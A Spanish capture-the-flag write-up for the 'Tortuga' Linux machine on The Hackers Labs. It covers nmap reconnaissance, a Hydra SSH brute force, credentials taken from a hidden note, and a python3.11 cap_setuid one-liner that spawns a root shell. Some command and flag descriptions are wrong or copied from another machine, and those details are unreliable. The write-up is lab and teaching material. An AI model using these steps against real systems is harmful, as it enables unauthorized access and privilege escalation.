# Tortuga

<img width="1348" height="631" alt="image" src="https://github.com/user-attachments/assets/d77c75b3-2d75-4175-aca5-b8f7f25cba35" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 22/07/2026

## 0. Resumen

Máquina Linux fácil con temática pirata

El camino de explotación combina:
- Enumeración web para obtención de posibles nombres de usuario
- Fuerza bruta SSH con Hydra para acceso inicial
- Escalada horizontal a un segundo usuario mediante archivo oculto
- Escalada a root abusando de una Linux capability (`cap_setuid`) asignada a `python3.11`

## 1. Reconocimiento

   Ping
   
```bash
ping -c 2 <IP>
```

<img width="1245" height="143" alt="image" src="https://github.com/user-attachments/assets/90c37f31-14c9-4a1b-a611-ad990db2ab77" />

→ TTL=64 sugiere que se trata de un host Linux

   Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA tortuga
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

**Resultados:**

- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 80: Apache 2.4.62, sitio "Isla Tortuga" 

## 3. Enumeración web

<img width="1598" height="573" alt="image" src="https://github.com/user-attachments/assets/d806b3d2-5b5a-48ad-bfdb-171a873bc933" />

### 3.1 Navegación inicial

La página principal ofrece dos enlaces:

- **Ver el mapa de la isla** → `mapa.php`

<img width="1384" height="365" alt="image" src="https://github.com/user-attachments/assets/39be6d8d-4db0-4d99-992a-256f2e7377e3" />

- **Conocer la tripulación** → `tripulacion.php`

<img width="1034" height="281" alt="image" src="https://github.com/user-attachments/assets/09195fe2-ed54-49e1-8daf-433cf7792f12" />

### 3.2 Descubrimiento de la pista

En `mapa.php` aparece un mensaje dirigido al jugador:

> *"Ey grumete, revisa la nota oculta que he dejado en tu camarote…"*

→ Confirma la existencia de un usuario del sistema llamado **`grumete`** y anticipa un archivo oculto en su home

### 3.3 Fuzzing de directorios (verificación adicional)

```bash
gobuster dir -u http://lavashop.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

| Orden | Función |
|---|---|
| `-u` | URL |
| `-P` | Diccionario con contraseñas comunes |
| `-x` | Extensión de archivos |

<img width="1173" height="422" alt="image" src="https://github.com/user-attachments/assets/4fe46a84-20a3-459a-994e-8ab7526797ed" />

→ No se encuentran rutas adicionales relevantes; el vector principal sigue siendo la pista de `mapa.php`

## 4. Acceso inicial — Fuerza bruta SSH

### 4.1 Hydra

```bash
hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

| Orden | Función |
|---|---|
| `-l` | Nombre de usuario |
| `-P` | Diccionario con contraseñas comunes |
| `-ssh` | Número de tareas simultáneas |

<img width="1485" height="245" alt="image" src="https://github.com/user-attachments/assets/92fb9333-925b-4487-8dde-5458008622e0" />

→ Credenciales válidas: **`grumete : 1234`**

### 4.2 Conexión SSH

```bash
ssh grumete@<IP>
```

### 4.3 Pista para el siguiente usuario

```bash
ls -la /home/grumete

cat /home/grumete/nota.txt
```

<img width="1205" height="345" alt="image" src="https://github.com/user-attachments/assets/e7571a32-6d7f-41dd-a0cb-0a03ec426cbd" />

→ La nota revela la contraseña del usuario **`capitan`**

### 4.3 Verificación adicional de usuarios del sistema

```bash
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
```

<img width="1125" height="59" alt="image" src="https://github.com/user-attachments/assets/d0703486-30d4-4a71-b721-a65d289ef211" />

→ No existen más usuarios en el sistema

## 5. Escalada de privilegios horizontal

```bash
su capitan
```

→ Cambio de un usuario sin privilegios especiales a otro con el mismo nivel de privilegios, usando la contraseña obtenida en `/home/grumete/.nota.txt`

## 6. Escalada a root — Linux Capabilities

### 6.1 Enumeración de capabilities y SUID

```bash
getcap -r / 2>/dev/null

find / -perm -4000 2>/dev/null
```

<img width="1117" height="86" alt="image" src="https://github.com/user-attachments/assets/1a5a78c1-1a96-47c8-841d-a9dfed60813a" />

→ Hallazgo clave: `/usr/bin/python3.11 = cap_setuid+ep`

### 6.2 ¿Qué significa `cap_setuid=ep`?

Las Linux capabilities dividen los privilegios de root en unidades otorgables individualmente a binarios concretos

`cap_setuid` permite a un proceso invocar `setuid()` y cambiar su propio UID, normalmente reservado a root

Los sufijos `e` (*effective*) y `p` (*permitted*) indican que la capacidad está activa y disponible de inmediato

Al tratarse de un intérprete tan flexible como Python, cualquier usuario que pueda ejecutarlo puede usar esa capability para autoconcederse UID 0

Exploramos las opciones disponibles en GTFOBins buscando la palabra `python` y seleccionamos `Capabilities`

<img width="1299" height="224" alt="image" src="https://github.com/user-attachments/assets/a7d6ab65-a715-4c07-b843-93f6fd3efd53" />

### 6.3 Explotación

```bash
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

| Instrucción | Función |
|---|---|
| `import os` | Módulo de sistema operativo de Python |
| `os.setuid(0)` | Usa la capability para poner el UID del proceso a 0 (root) |
| `os.system("/bin/bash")` | Lanza una shell heredando ese UID |

→ Shell con privilegios de root

### 6.4 Primera flag (grumete)

```bash
cat /home/grumete/user.txt
```

### 6.5 Segunda flag (root)

```bash
cat /root/root.txt
```

## 7. Lecciones aprendidas

<img width="1216" height="528" alt="image" src="https://github.com/user-attachments/assets/e5e8f81c-248a-4084-a335-7cfc3c794b17" />

- **Enumeración web manual:** el contenido de la aplicación `mapa.php` filtró directamente el nombre de usuario grumete, recordando que leer con atención la web es tan importante como el fuzzing automatizado
  
- **Contraseñas débiles:** un ataque de fuerza bruta con un diccionario básico `rockyou.txt` fue suficiente para comprometer SSH, reforzando la importancia de políticas de contraseñas robustas y mecanismos de limitación de intentos (fail2ban, rate limiting)
  
- **Archivos ocultos como vector de movimiento lateral:** una nota `.nota.txt` en el `/home` de un usuario contenía las credenciales del siguiente usuario, permitiendo escalar horizontalmente sin explotar ninguna vulnerabilidad técnica, solo higiene deficiente en el manejo de secretos
  
- **Linux Capabilities mal configuradas:** asignar `cap_setuid` a un intérprete como `python3.11` equivale a dar una puerta trasera a root, ya que cualquier lenguaje con acceso a llamadas al sistema puede abusar de ella. Siempre revisar `getcap -r /` además de `find / -perm -4000`, y verificar cada hallazgo en `GTFOBins`
